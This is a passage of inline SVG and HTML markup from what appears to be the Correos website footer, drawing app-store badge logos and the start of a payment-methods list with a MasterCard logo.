																				<path d="M53.2182,28.0154107 L57.6541695,28.0154107 L56.0851008,23.6922962 C55.8593908,23.097884 55.6375282,22.4018382 55.4191924,21.6041588 C55.2386885,22.2662198 55.0242,22.9587389 54.7757267,23.6810748 L53.2182,28.0154107 Z M58.5682305,30.5437466 L52.3153603,30.5437466 L50.8367038,34.6863573 L47.529284,34.6863573 L53.872887,18.3307237 L57.101116,18.3307237 L63.5800168,34.6863573 L60.0696504,34.6863573 L58.5682305,30.5437466 Z" id="Fill-1" fill="#FFFFFF"></path>
																				<path d="M72.3080015,31.4806031 C72.8386122,30.7659618 73.1037573,29.7159618 73.1037573,28.3315649 C73.1037573,27.0824656 72.8908718,26.1793053 72.4660626,25.6224046 C72.0409328,25.0655038 71.4744137,24.7872137 70.7671466,24.7872137 C70.2855893,24.7872137 69.8396198,24.9019924 69.4295588,25.1315496 C69.0194977,25.3611069 68.6113603,25.6788321 68.2051466,26.0850458 L68.2051466,32.1689542 C68.4382305,32.2821298 68.7222916,32.374145 69.0573298,32.4456412 C69.3920473,32.5171374 69.7248412,32.5530458 70.0563527,32.5530458 C71.0268412,32.5530458 71.7773908,32.1955649 72.3080015,31.4806031 L72.3080015,31.4806031 Z M64.9541542,25.4871069 C64.9541542,24.5615038 64.9240168,23.5567099 64.8640626,22.4733664 L67.9566733,22.4733664 C68.0618336,22.9174122 68.1333298,23.443855 68.1711618,24.0533359 C68.6527191,23.4967557 69.1983985,23.0546336 69.8078794,22.7272901 C70.4173603,22.3999466 71.0944901,22.2364351 71.8395893,22.2364351 C72.6597115,22.2364351 73.4141084,22.4413053 74.1027802,22.8513664 C74.7911313,23.2617481 75.3480321,23.9068168 75.7731618,24.7872137 C76.1982916,25.6676107 76.4108565,26.7814122 76.4108565,28.1282977 C76.4108565,29.5806641 76.1569328,30.818542 75.6490855,31.8416107 C75.1412382,32.8653206 74.4394214,33.6367099 73.5439557,34.1557786 C72.6484901,34.6748473 71.6251008,34.934542 70.4737878,34.934542 C69.7738947,34.934542 69.017574,34.8104656 68.2051466,34.5619924 L68.2051466,39.5397939 L64.9541542,39.7767252 L64.9541542,25.4871069 Z" id="Fill-3" fill="#FFFFFF"></path>
																				<path d="M85.8497313,31.4806031 C86.3800214,30.7659618 86.645487,29.7159618 86.645487,28.3315649 C86.645487,27.0824656 86.4326015,26.1793053 86.0077924,25.6224046 C85.5826626,25.0655038 85.0161435,24.7872137 84.3088763,24.7872137 C83.8273191,24.7872137 83.3816702,24.9019924 82.9712885,25.1315496 C82.5612275,25.3611069 82.1530901,25.6788321 81.7465557,26.0850458 L81.7465557,32.1689542 C81.9799603,32.2821298 82.2640214,32.374145 82.5987389,32.4456412 C82.9334565,32.5171374 83.266571,32.5530458 83.5980824,32.5530458 C84.568571,32.5530458 85.3194412,32.1955649 85.8497313,31.4806031 L85.8497313,31.4806031 Z M78.495884,25.4871069 C78.495884,24.5615038 78.4657466,23.5567099 78.4054718,22.4733664 L81.4984031,22.4733664 C81.603884,22.9174122 81.6750595,23.443855 81.7128916,24.0533359 C82.1944489,23.4967557 82.7401282,23.0546336 83.3496092,22.7272901 C83.9590901,22.3999466 84.6362198,22.2364351 85.3813191,22.2364351 C86.2014412,22.2364351 86.9558382,22.4413053 87.6445099,22.8513664 C88.3328611,23.2617481 88.8897618,23.9068168 89.3152122,24.7872137 C89.7400214,25.6676107 89.9525863,26.7814122 89.9525863,28.1282977 C89.9525863,29.5806641 89.6986626,30.818542 89.1908153,31.8416107 C88.6829679,32.8653206 87.9808305,33.6367099 87.0856855,34.1557786 C86.1902198,34.6748473 85.1668305,34.934542 84.0155176,34.934542 C83.315945,34.934542 82.5593038,34.8104656 81.7465557,34.5619924 L81.7465557,39.5397939 L78.495884,39.7767252 L78.495884,25.4871069 Z" id="Fill-5" fill="#FFFFFF"></path>
																				<path d="M95.4382992,33.9243298 C94.2154901,33.266116 93.270971,32.315826 92.6050626,31.0741008 C91.9391542,29.8326962 91.6063603,28.357887 91.6063603,26.6496733 C91.6063603,24.7910931 91.987887,23.2220244 92.7519023,21.9427878 C93.5155969,20.6635511 94.5466809,19.705887 95.8448336,19.070116 C97.1426656,18.434345 98.5969557,18.1162992 100.207063,18.1162992 C102.005368,18.1162992 103.710055,18.4926962 105.320162,19.2451695 L104.575383,21.7058565 C103.123017,21.0133374 101.723551,20.6670779 100.376345,20.6670779 C99.2853069,20.6670779 98.3353374,20.8969557 97.5264366,21.3557496 C96.7172153,21.8148641 96.0910626,22.4900702 95.6470168,23.3820092 C95.202971,24.2736275 94.9811084,25.3553679 94.9811084,26.6269099 C94.9811084,27.7407115 95.1519939,28.728513 95.4947267,29.5899939 C95.8368183,30.4514748 96.3732,31.1308489 97.1029099,31.6271542 C97.8329405,32.1241008 98.7623908,32.3722534 99.8912611,32.3722534 C100.884192,32.3722534 101.825185,32.2180397 102.712956,31.9096122 L102.712956,28.8958718 L99.1233985,28.8958718 L99.1233985,26.4576275 L105.851093,26.4576275 L105.851093,33.5575511 C104.903047,33.9939023 103.907551,34.3289405 102.865246,34.5620244 C101.82294,34.7951084 100.782879,34.9121313 99.7444214,34.9121313 C98.0964824,34.9121313 96.6607878,34.5828641 95.4382992,33.9243298" id="Fill-7" fill="#FFFFFF"></path>
																				<path d="M114.117334,32.1804 C114.636403,31.939942 115.069227,31.6350412 115.415487,31.2660183 L115.415487,29.2458504 C114.722968,29.1705069 114.154846,29.1329954 113.7108,29.1329954 C112.687411,29.1329954 111.980144,29.2984305 111.588678,29.6293008 C111.197533,29.9608122 111.00196,30.4045374 111.00196,30.9614382 C111.00196,31.4958962 111.144953,31.8928122 111.430937,32.1521863 C111.716922,32.4118809 112.108067,32.5417282 112.604693,32.5417282 C113.093945,32.5417282 113.597945,32.4211786 114.117334,32.1804 L114.117334,32.1804 Z M115.66364,34.6862931 C115.550785,34.1973618 115.483136,33.6779725 115.460373,33.1287664 C115.03909,33.6250718 114.497258,34.0466748 113.835197,34.3926137 C113.172815,34.7388733 112.420342,34.9120031 111.577456,34.9120031 C110.870189,34.9120031 110.2248,34.7725374 109.64193,34.4942473 C109.058739,34.2162779 108.59225,33.7946748 108.242144,33.2300794 C107.892357,32.6658046 107.717304,31.9736061 107.717304,31.1531634 C107.717304,28.5648733 109.575884,27.2705679 113.293365,27.2705679 C114.015701,27.2705679 114.722968,27.3193008 115.415487,27.417087 L115.415487,27.2138198 C115.415487,26.2584 115.196831,25.5812702 114.7608,25.1821099 C114.324449,24.7835908 113.699579,24.584171 112.886831,24.584171 C112.292418,24.584171 111.651197,24.6707359 110.962525,24.843545 C110.273853,25.0166748 109.665976,25.2237893 109.139533,25.4645679 L108.66535,23.1391786 C109.184739,22.9060947 109.863472,22.6970565 110.702831,22.5127053 C111.541869,22.3283542 112.427716,22.2363389 113.361014,22.2363389 C115.046464,22.2363389 116.348144,22.633255 117.266373,23.427087 C118.184602,24.2209191 118.643395,25.5812702 118.643395,27.5074992 L118.643395,32.3948885 C118.643395,32.8992092 118.673533,33.6632244 118.733808,34.6862931 L115.66364,34.6862931 Z" id="Fill-9" fill="#FFFFFF"></path>
																				<path d="M121.995765,34.1162473 C121.472528,33.5856366 121.211231,32.7523695 121.211231,31.6161252 L121.211231,17.3713924 L124.450681,17.1456824 L124.450681,31.029087 C124.450681,31.5183389 124.542696,31.8626748 124.727368,32.061774 C124.911719,32.2611939 125.180711,32.3609038 125.534345,32.3609038 C125.76775,32.3609038 126.034818,32.312171 126.335551,32.2143847 L126.708101,34.4942473 C126.407368,34.6224916 126.032895,34.7238046 125.585002,34.7991481 C125.137429,34.874171 124.710376,34.9120031 124.303841,34.9120031 C123.288147,34.9120031 122.518681,34.646858 121.995765,34.1162473" id="Fill-11" fill="#FFFFFF"></path>
																				<path d="M128.73109,34.1162473 C128.207853,33.5856366 127.946556,32.7523695 127.946556,31.6161252 L127.946556,17.3713924 L131.186006,17.1456824 L131.186006,31.029087 C131.186006,31.5183389 131.278021,31.8626748 131.462693,32.061774 C131.647044,32.2611939 131.916037,32.3609038 132.26967,32.3609038 C132.503075,32.3609038 132.770144,32.312171 133.070876,32.2143847 L133.443426,34.4942473 C133.142693,34.6224916 132.76822,34.7238046 132.320327,34.7991481 C131.872754,34.874171 131.445701,34.9120031 131.039166,34.9120031 C130.023472,34.9120031 129.254006,34.646858 128.73109,34.1162473" id="Fill-13" fill="#FFFFFF"></path>
																				<path d="M142.021429,27.1462672 C141.976223,26.2732443 141.756284,25.6166336 141.360971,25.1764351 C140.966299,24.7362366 140.437612,24.5162977 139.775231,24.5162977 C139.128238,24.5162977 138.594101,24.7346336 138.172498,25.1709847 C137.751215,25.6073359 137.472605,26.2658702 137.337307,27.1462672 L142.021429,27.1462672 Z M145.159246,29.1215496 L137.280879,29.1215496 C137.378666,30.2953053 137.719154,31.1458855 138.302345,31.6726489 C138.885536,32.1994122 139.685139,32.4626336 140.700834,32.4626336 C141.272803,32.4626336 141.861444,32.3949847 142.467398,32.2593664 C143.073032,32.1240687 143.658147,31.9397176 144.222421,31.706313 L144.922315,33.896084 C143.492711,34.5735344 141.9012,34.9120992 140.14778,34.9120992 C138.123444,34.9120992 136.590605,34.3757176 135.548299,33.3035954 C134.505994,32.2311527 133.985002,30.7169084 133.985002,28.7602214 C133.985002,27.4059618 134.229307,26.2376565 134.718559,25.255626 C135.20749,24.2735954 135.890391,23.5249695 136.767261,23.0094275 C137.643811,22.4942061 138.654055,22.2364351 139.797673,22.2364351 C140.994513,22.2364351 141.993215,22.5128015 142.794742,23.065855 C143.595948,23.6189084 144.190681,24.362084 144.578299,25.2950611 C144.965597,26.2283588 145.159246,27.2629695 145.159246,28.3992137 L145.159246,29.1215496 Z" id="Fill-15" fill="#FFFFFF"></path>
																				<path d="M147.237925,25.5208351 C147.237925,24.8437053 147.207467,23.8276901 147.147513,22.4734305 L150.217681,22.4734305 C150.262887,22.8043008 150.305849,23.2069878 150.347528,23.681171 C150.388887,24.1550336 150.417101,24.5388046 150.432169,24.832484 C150.755666,24.2906519 151.071788,23.8373084 151.380215,23.4721328 C151.688963,23.1072779 152.048047,22.8100718 152.458108,22.5805145 C152.86849,22.3509573 153.340429,22.2361786 153.874887,22.2361786 C154.281421,22.2361786 154.649803,22.2852321 154.980994,22.3830183 L154.57478,25.1598275 C154.296169,25.084484 153.995116,25.0466519 153.67162,25.0466519 C153.032002,25.0466519 152.473177,25.1992626 151.995467,25.5038427 C151.517757,25.8087435 151.011834,26.3185145 150.477376,27.0334763 L150.477376,34.6861328 L147.237925,34.6861328 L147.237925,25.5208351 Z" id="Fill-17" fill="#FFFFFF"></path>
																				<g id="Group-21" transform="translate(154.854962, 22.463908)">
																					<mask id="mask-2" fill="white">
																						<use xlink:href="#path-1"></use>
																					</mask>
																					<g id="Clip-20"></g>
																					<path d="M1.3159145,17.1999618 C0.868341985,17.1249389 0.512784733,17.0422214 0.249242748,16.9518092 L0.825059542,14.6267405 C0.9828,14.671626 1.21428092,14.7206794 1.51918168,14.7735802 C1.82376183,14.8258397 2.10397557,14.8524504 2.36014351,14.8524504 C2.96930382,14.8524504 3.49799084,14.6735496 3.94588397,14.3160687 C4.39345649,13.9585878 4.74901374,13.4414427 5.01255573,12.764313 L5.15907481,12.4029847 L0.700662595,0.00945801527 L4.19980763,0.00945801527 L6.25396031,6.58999237 C6.57040305,7.65858779 6.78072366,8.5351374 6.88620458,9.21996183 C7.10454046,8.25684733 7.33409771,7.38767176 7.57455573,6.61243511 L9.69699847,0.00945801527 L12.9249069,0.00945801527 L8.55690687,12.256145 C8.13530382,13.4600382 7.66528855,14.4289237 7.14589924,15.1628015 C6.62650992,15.8966794 6.01157863,16.4381908 5.30046412,16.7882977 C4.58934962,17.138084 3.74069313,17.3131374 2.75481527,17.3131374 C2.24344122,17.3131374 1.76348702,17.2749847 1.3159145,17.1999618" id="Fill-19" fill="#FFFFFF" mask="url(#mask-2)"></path>
																				</g>
																				<polygon id="Fill-22" fill="#FFFFFF" points="47.8470412 2.51057405 52.9367359 2.51057405 52.7822015 3.50382595 49.0066901 3.50382595 49.0066901 6.34796336 52.5786137 6.34796336 52.5786137 7.30402443 49.0066901 7.30402443 49.0066901 10.4379939 52.9736061 10.4379939 52.8440794 11.443429 47.8470412 11.443429"></polygon>
																				<polygon id="Fill-24" fill="#FFFFFF" points="56.539374 6.8845374 53.7632061 2.5104458 55.1020763 2.5104458 57.180916 5.97143817 59.3463206 2.5104458 60.6354962 2.5104458 57.8779237 6.82907176 60.863771 11.4436214 59.5005344 11.4436214 57.2056031 7.69279695 54.8244275 11.4436214 53.5349313 11.4436214"></polygon>
																				<path d="M65.6728672,6.59775115 C66.0572794,6.2543771 66.2496458,5.77602595 66.2496458,5.16333893 C66.2496458,4.55898779 66.0614473,4.12071298 65.685371,3.84947634 C65.308974,3.57791908 64.762974,3.44230076 64.047371,3.44230076 L62.9861496,3.44230076 L62.9861496,7.00781221 C63.3728061,7.07802595 63.7100885,7.11265191 63.9979969,7.11265191 C64.7299511,7.11265191 65.2881344,6.94112519 65.6728672,6.59775115 L65.6728672,6.59775115 Z M61.8265008,2.51060611 L64.072058,2.51060611 C65.1579664,2.51060611 65.9864244,2.73375115 66.5580733,3.18004122 C67.1297221,3.6263313 67.4157069,4.27300305 67.4157069,5.1203771 C67.4157069,5.7083771 67.2810504,6.22359847 67.0114168,6.6654 C66.7421038,7.10752214 66.364745,7.44897252 65.8796611,7.68975115 C65.3942565,7.93020916 64.8389588,8.05043817 64.2137679,8.05043817 C63.8065924,8.05043817 63.3974931,8.0033084 62.9861496,7.90872824 L62.9861496,11.4434611 L61.8265008,11.4434611 L61.8265008,2.51060611 Z" id="Fill-26" fill="#FFFFFF"></path>
																				<polygon id="Fill-28" fill="#FFFFFF" points="68.7546733 2.51057405 69.9143221 2.51057405 69.9143221 10.4072153 73.7885817 10.4072153 73.659055 11.443429 68.7546733 11.443429"></polygon>
																				<path d="M79.8994855,10.1357542 C80.3739893,9.82315878 80.7298672,9.39354046 80.9664779,8.84657863 C81.2030885,8.29929618 81.3217145,7.67410534 81.3217145,6.97100611 C81.3217145,6.28425802 81.217516,5.66932672 81.0097603,5.12621221 C80.801684,4.58341832 80.4679282,4.15155573 80.0072107,3.83062443 C79.5468137,3.51001374 78.9546458,3.3497084 78.2307069,3.3497084 C77.5436382,3.3497084 76.9607679,3.51321985 76.4817756,3.84024275 C76.0024626,4.16694504 75.6436992,4.60425802 75.4051649,5.15121985 C75.1666305,5.69818168 75.0473634,6.30060916 75.0473634,6.95850229 C75.0473634,7.64973893 75.1605389,8.26947939 75.3865695,8.8186855 C75.6126,9.36757099 75.9591802,9.80263969 76.4259893,10.1232504 C76.8931191,10.4441817 77.4698977,10.604487 78.1566458,10.604487 C78.8430733,10.604487 79.4243405,10.4483496 79.8994855,10.1357542 M75.793745,11.005571 C75.156371,10.6314183 74.6690427,10.1059374 74.3317603,9.42944885 C73.9944779,8.75296031 73.8258366,7.96618168 73.8258366,7.0697542 C73.8258366,6.1278 74.0056992,5.30447176 74.365745,4.59880763 C74.7254702,3.89346412 75.2438977,3.34874656 75.9203863,2.96401374 C76.5968748,2.57960153 77.3958366,2.38723511 78.3169511,2.38723511 C79.1970275,2.38723511 79.955913,2.57350992 80.593287,2.94573893 C81.2306611,3.31764733 81.7160656,3.84120458 82.0491802,4.51576947 C82.3822947,5.19033435 82.5490122,5.9716626 82.5490122,6.8597542 C82.5490122,7.81805954 82.367226,8.65100611 82.0030122,9.35827328 C81.6391191,10.0658611 81.1187679,10.6105786 80.4422794,10.9930672 C79.7654702,11.3758763 78.9726,11.5669603 78.0639893,11.5669603 C77.1880809,11.5669603 76.4311191,11.3797237 75.793745,11.005571" id="Fill-30" fill="#FFFFFF"></path>
																				<path d="M86.3308076,6.86607023 C86.7543344,6.86607023 87.128487,6.78495573 87.4535863,6.62240611 C87.7786855,6.45985649 88.0306855,6.22965802 88.2092656,5.93149008 C88.3881664,5.63332214 88.4776168,5.29090992 88.4776168,4.90425344 C88.4776168,4.39448244 88.3150672,4.02321527 87.9902885,3.79077252 C87.6655099,3.55832977 87.1926092,3.4422687 86.5715863,3.4422687 L85.2820901,3.4422687 L85.2820901,6.86607023 L86.3308076,6.86607023 Z M84.1221206,2.51057405 L86.7072046,2.51057405 C87.6530061,2.51057405 88.3830366,2.70903206 88.8972962,3.10594809 C89.4112351,3.50286412 89.6683649,4.07547481 89.6683649,4.82410076 C89.6683649,5.30116947 89.5699374,5.72084885 89.3721206,6.08249771 C89.174945,6.44446718 88.9290366,6.74071145 88.6350366,6.97090992 C88.3410366,7.2011084 88.033571,7.3780855 87.7129603,7.50152061 L90.5074031,11.443429 L89.125571,11.443429 L86.6148687,7.79744427 L85.2820901,7.79744427 L85.2820901,11.443429 L84.1221206,11.443429 L84.1221206,2.51057405 Z" id="Fill-32" fill="#FFFFFF"></path>
																				<path d="M93.4252489,7.89632061 L96.4973405,7.89632061 L95.3931573,5.0339084 C95.2902412,4.79120611 95.1671267,4.45616794 95.0228519,4.02815267 L94.9491115,3.82456489 C94.8340122,4.19487023 94.6961496,4.59178626 94.5358443,5.01531298 L93.4252489,7.89632061 Z M96.8737374,8.84629008 L93.0674473,8.84629008 L92.0806076,11.4435573 L90.8587603,11.4435573 L94.4310046,2.51070229 L95.4858137,2.51070229 L99.1439817,11.4435573 L97.8916763,11.4435573 L96.8737374,8.84629008 Z" id="Fill-34" fill="#FFFFFF"></path>
																				<path d="M105.134753,7.89632061 L108.206844,7.89632061 L107.102661,5.0339084 C106.999745,4.79120611 106.876631,4.45616794 106.732356,4.02815267 L106.658615,3.82456489 C106.543516,4.19487023 106.405653,4.59178626 106.245348,5.01531298 L105.134753,7.89632061 Z M108.583241,8.84629008 L104.776951,8.84629008 L103.790111,11.4435573 L102.568264,11.4435573 L106.140508,2.51070229 L107.195318,2.51070229 L110.853485,11.4435573 L109.60118,11.4435573 L108.583241,8.84629008 Z" id="Fill-36" fill="#FFFFFF"></path>
																				<path d="M117.127901,10.1418458 C117.600802,9.82508244 117.955397,9.38905191 118.192008,8.83407481 C118.428618,8.2787771 118.546924,7.64557099 118.546924,6.93381527 C118.546924,6.26758626 118.442084,5.66515878 118.232084,5.12621221 C118.022405,4.58758626 117.68929,4.15700611 117.23274,3.83383053 C116.776191,3.51097557 116.196527,3.3497084 115.493107,3.3497084 C114.789687,3.3497084 114.196237,3.51001374 113.713397,3.83062443 C113.229916,4.15155573 112.869229,4.58854809 112.630695,5.14192214 C112.39216,5.69497557 112.272573,6.31696031 112.272573,7.00787634 C112.272573,7.67827328 112.387031,8.28583053 112.615305,8.8308687 C112.84358,9.37590687 113.191122,9.80969313 113.657931,10.1325481 C114.12442,10.4557237 114.703443,10.6166702 115.394359,10.6166702 C116.07726,10.6166702 116.654679,10.4586092 117.127901,10.1418458 M118.096466,12.8994183 C117.586695,12.6688992 117.115718,12.4316473 116.683534,12.1870214 C116.251992,11.9420748 115.916634,11.721174 115.67842,11.5236779 C115.534145,11.5525328 115.379931,11.5669603 115.215458,11.5669603 C114.364237,11.5669603 113.624588,11.3787618 112.997473,11.0023649 C112.370359,10.6262885 111.889122,10.0976015 111.554084,9.41694504 C111.218725,8.73628855 111.051366,7.94790687 111.051366,7.05115878 C111.051366,6.11754046 111.233153,5.29805954 111.597366,4.59271603 C111.96126,3.88737252 112.479366,3.34137252 113.152008,2.95471603 C113.824328,2.56838015 114.61271,2.3747313 115.517794,2.3747313 C116.414221,2.3747313 117.182405,2.56196794 117.822023,2.93612061 C118.461321,3.31059389 118.946725,3.83607481 119.277916,4.51256336 C119.608786,5.18905191 119.774542,5.97550992 119.774542,6.87225802 C119.774542,7.60421221 119.664252,8.26627328 119.444634,8.85876183 C119.224374,9.45092977 118.906649,9.95172366 118.491458,10.3608229 C118.075947,10.7699221 117.580282,11.0754641 117.004466,11.2771282 C118.028817,11.7785634 119.108313,12.1549603 120.243275,12.4059985 L119.55845,13.4608076 C119.093885,13.3168534 118.606237,13.1296168 118.096466,12.8994183" id="Fill-38" fill="#FFFFFF"></path>
																				<path d="M122.902356,11.1937053 C122.375592,10.9407435 121.970661,10.5746061 121.686921,10.0956137 C121.40318,9.61662137 121.26115,9.04176641 121.26115,8.37136947 L121.26115,2.51060611 L122.408615,2.51060611 L122.408615,8.14918626 C122.408615,8.94301832 122.607073,9.54640763 123.003989,9.95999542 C123.400905,10.3732626 123.987944,10.5797359 124.765424,10.5797359 C125.563104,10.5797359 126.148218,10.3681328 126.520447,9.94460611 C126.892356,9.52075878 127.078631,8.90999542 127.078631,8.11231603 L127.078631,2.51060611 L128.226096,2.51060611 L128.226096,8.35886565 C128.226096,9.03759847 128.08631,9.6172626 127.806737,10.0984992 C127.527165,10.5797359 127.128325,10.9461939 126.609898,11.1969115 C126.09147,11.447629 125.47686,11.5733084 124.765424,11.5733084 C124.049821,11.5733084 123.428798,11.4466672 122.902356,11.1937053" id="Fill-40" fill="#FFFFFF"></path>
																				<mask id="mask-4" fill="white">
																					<use xlink:href="#path-3"></use>
																				</mask>
																				<g id="Clip-43"></g>
																				<path d="M130.324076,11.4435573 L131.484046,11.4435573 L131.484046,2.51070229 L130.324076,2.51070229 L130.324076,11.4435573 Z M129.898626,1.84447328 L131.508412,0 L132.890565,0.15421374 L130.620321,1.9800916 L129.898626,1.84447328 Z" id="Fill-42" fill="#FFFFFF" mask="url(#mask-4)"></path>
																				<path d="M28.7952641,38.5296779 L7.34961527,38.5296779 C3.30735573,38.5296779 -6.41221374e-05,35.222258 -6.41221374e-05,31.1799985 L-6.41221374e-05,9.73434962 C-6.41221374e-05,5.69209008 3.30735573,2.38467023 7.34961527,2.38467023 L28.7952641,2.38467023 C32.8375237,2.38467023 36.1449435,5.69209008 36.1449435,9.73434962 L36.1449435,31.1799985 C36.1449435,35.222258 32.8375237,38.5296779 28.7952641,38.5296779" id="Fill-44" fill="#D10931" mask="url(#mask-4)"></path>
																				<path d="M18.0725038,14.4346947 C14.6176031,14.4346947 11.8071298,11.6239008 11.8071298,8.16932061 L12.7689618,8.16932061 C12.7689618,11.0936107 15.1478931,13.4728626 18.0725038,13.4728626 C20.9971145,13.4728626 23.3760458,11.0936107 23.3760458,8.16932061 L24.3378779,8.16932061 C24.3378779,11.6239008 21.5274046,14.4346947 18.0725038,14.4346947" id="Fill-45" fill="#FFFFFF" mask="url(#mask-4)"></path>
																				<polygon id="Fill-46" fill="#FFFFFF" mask="url(#mask-4)" points="3.62716489 20.3645817 4.6207374 20.3645817 4.6207374 22.3449939 6.83359237 22.3449939 6.83359237 20.3645817 7.82716489 20.3645817 7.82716489 25.3090397 6.83359237 25.3090397 6.83359237 23.1372229 4.6207374 23.1372229 4.6207374 25.3090397 3.62716489 25.3090397"></polygon>
																				<path d="M10.2155221,25.1690611 C9.90485038,25.0257481 9.66567481,24.8186336 9.49863664,24.5477176 C9.33127786,24.2764809 9.24759847,23.9533053 9.24759847,23.5778702 L9.24759847,20.3647099 L10.2309115,20.3647099 L10.2309115,23.4377634 C10.2309115,23.804542 10.3219649,24.0837939 10.5040718,24.2761603 C10.6861786,24.4685267 10.9561328,24.5647099 11.3132931,24.5647099 C12.0189573,24.5647099 12.3719496,24.1822214 12.3719496,23.4175649 L12.3719496,20.3647099 L13.3587893,20.3647099 L13.3587893,23.5711374 C13.3587893,23.9513817 13.2763924,24.2774427 13.1112779,24.5493206 C12.9461634,24.8215191 12.7105145,25.0286336 12.4043313,25.1706641 C12.0981481,25.3130153 11.7345756,25.3841908 11.3132931,25.3841908 C10.8923313,25.3841908 10.5261939,25.312374 10.2155221,25.1690611" id="Fill-47" fill="#FFFFFF" mask="url(#mask-4)"></path>
																				<path d="M15.8548397,23.2909557 L17.196916,23.2909557 L16.7220916,21.9831847 C16.6538015,21.8033221 16.5867939,21.5926809 16.5207481,21.3515817 C16.4659237,21.5516427 16.4011603,21.7613221 16.3261374,21.979658 L15.8548397,23.2909557 Z M17.4732824,24.0559328 L15.5816794,24.0559328 L15.1341069,25.3092 L14.1338015,25.3092 L16.0529771,20.3612153 L17.0295573,20.3612153 L18.9894504,25.3092 L17.9272672,25.3092 L17.4732824,24.0559328 Z" id="Fill-48" fill="#FFFFFF" mask="url(#mask-4)"></path>
																				<path d="M19.1940321,20.3645817 L20.2459557,20.3645817 L21.0378641,23.3420931 C21.1109634,23.6085206 21.1689939,23.8816809 21.2119557,24.1618947 C21.2872992,23.8294214 21.3578336,23.5517725 21.4238794,23.3286275 L22.2674061,20.3645817 L23.3020168,20.3645817 L24.1933145,23.348826 C24.2911008,23.679055 24.3561847,23.949971 24.3879252,24.1618947 C24.4289634,23.9432382 24.4905206,23.6835435 24.5722763,23.3831313 L25.3404595,20.3645817 L26.3343527,20.3645817 L24.8694824,25.3090397 L23.8416046,25.3090397 L23.0083374,22.508826 C22.9512687,22.3244748 22.9047802,22.1539099 22.8682305,21.9968107 C22.8320015,21.8397115 22.7967344,21.6643374 22.762429,21.4706885 C22.7262,21.6601695 22.6896504,21.8307344 22.6534214,21.9830244 C22.6168718,22.1356351 22.571345,22.3065206 22.5165206,22.4953603 L21.7040931,25.3090397 L20.6829481,25.3090397 L19.1940321,20.3645817 Z" id="Fill-49" fill="#FFFFFF" mask="url(#mask-4)"></path>
																				<polygon id="Fill-50" fill="#FFFFFF" mask="url(#mask-4)" points="27.3003847 20.3645817 30.2746901 20.3645817 30.1926137 21.1670702 28.2939573 21.1670702 28.2939573 22.3927649 30.0800794 22.3927649 30.0800794 23.1407496 28.2939573 23.1407496 28.2939573 24.4998183 30.2984153 24.4998183 30.2265985 25.3090397 27.3003847 25.3090397"></polygon>
																				<polygon id="Fill-51" fill="#FFFFFF" mask="url(#mask-4)" points="31.5240458 25.3090076 32.5179389 25.3090076 32.5179389 20.3645496 31.5240458 20.3645496"></polygon>
																			</g>
																		</g>
																	</svg>
																</a>
															</div>
														</li>
													</ul>
												</div>

												<div class="cdk-pay-list sc-correos-cdk-core-footer">
													<span class="cdk-title sc-correos-cdk-core-footer">Métodos de pago</span>
													<ul id="cartype" class="cdk-pay-list__list sc-correos-cdk-core-footer">
														<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
															<div style="padding-top:6px;padding-bottom:6px" class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" alt-image="MasterCard">
																<figure class="sc-correos-cdk-imageblock">
																	<svg width="40px" height="24px" viewBox="0 0 40 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
																		<title>logos/footer/mastercard</title>
																		<g id="UI-KIT" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
																			<g id="Correos_web_UIkit_06_Menu&amp;Footer" transform="translate(-672.000000, -11028.000000)">
																				<g id="molecules/footer/desktop" transform="translate(-240.000000, 10640.000000)">
																					<g id="Group-9" transform="translate(912.000000, 388.000000)">
																						<path d="M23.4180725,11.7091288 C23.4180725,18.1760822 18.1760822,23.4178875 11.7093138,23.4178875 C5.24236046,23.4178875 7.10542736e-15,18.1760822 7.10542736e-15,11.7091288 C7.10542736e-15,5.24236046 5.24236046,-1.24344979e-14 11.7093138,-1.24344979e-14 C18.1760822,-1.24344979e-14 23.4180725,5.24236046 23.4180725,11.7091288" id="Fill-333" fill="#CC0000"></path>
																						<path d="M27.4293637,-1.24344979e-14 C24.403224,-1.24344979e-14 21.6468723,1.14780142 19.5685061,3.03076566 C19.1456903,3.41453805 18.7510006,3.82902704 18.3866574,4.27034679 L20.7523903,4.27034679 C21.0754696,4.66374124 21.3731985,5.07730503 21.6450219,5.51048303 L17.4938407,5.51048303 C17.2455174,5.90850348 17.0197689,6.32206726 16.8191859,6.75061927 L22.3193067,6.75061927 C22.507307,7.15197043 22.6727325,7.56534918 22.8152131,7.99020039 L16.3232794,7.99020039 C16.1882004,8.39395707 16.0742159,8.80770589 15.9831764,9.22959647 L23.1549461,9.22959647 C23.3266629,10.0289681 23.4180725,10.8583161 23.4180725,11.7091288 C23.4180725,13.0090329 23.2062021,14.2602715 22.8152131,15.4287974 L16.3232794,15.4287974 C16.46576,15.8532785 16.6311855,16.2672123 16.8188158,16.6691186 L22.3193067,16.6691186 C22.1183535,17.0965604 21.8937153,17.5104943 21.6439117,17.9090698 L17.4938407,17.9090698 C17.7645538,18.3409526 18.0628378,18.7550715 18.3866574,19.1479108 L20.7516501,19.1479108 C20.388047,19.5896006 19.9929872,20.0040896 19.5688762,20.387862 C21.6470573,22.2708262 24.403224,23.4178875 27.4293637,23.4178875 C33.895947,23.4178875 39.1381224,18.1760822 39.1381224,11.7091288 C39.1381224,5.24291558 33.895947,-1.24344979e-14 27.4293637,-1.24344979e-14" id="Fill-334" fill="#FF9900"></path>
																						<path d="M8.97498181,12.991084 C8.84156816,12.9759108 8.78272553,12.9710997 8.69113087,12.9710997 C7.97058618,12.9710997 7.60624296,13.2183128 7.60624296,13.7066326 C7.60624296,14.0073222 7.78406613,14.1984682 8.06162572,14.1984682 C8.57955191,14.1984682 8.95277704,13.7055224 8.97498181,12.991084 L8.97498181,12.991084 Z M9.89962531,15.1432811 L8.84600912,15.1432811 L8.87024932,14.6427486 C8.54902036,15.0379935 8.12028331,15.226734 7.5379633,15.226734 C6.84924544,15.226734 6.37683902,14.6890085 6.37683902,13.9075858 C6.37683902,12.7312882 7.19823036,12.045346 8.60841811,12.045346 C8.75293414,12.045346 8.93760378,12.0586688 9.12671438,12.082539 C9.1659428,11.9230347 9.17630503,11.8553102 9.17630503,11.7692667 C9.17630503,11.4495181 8.95499752,11.3296123 8.36120504,11.3296123 C7.73928652,11.323321 7.2263564,11.4781992 7.01559615,11.5474041 C7.02891901,11.4670968 7.19193901,10.4610358 7.19193901,10.4610358 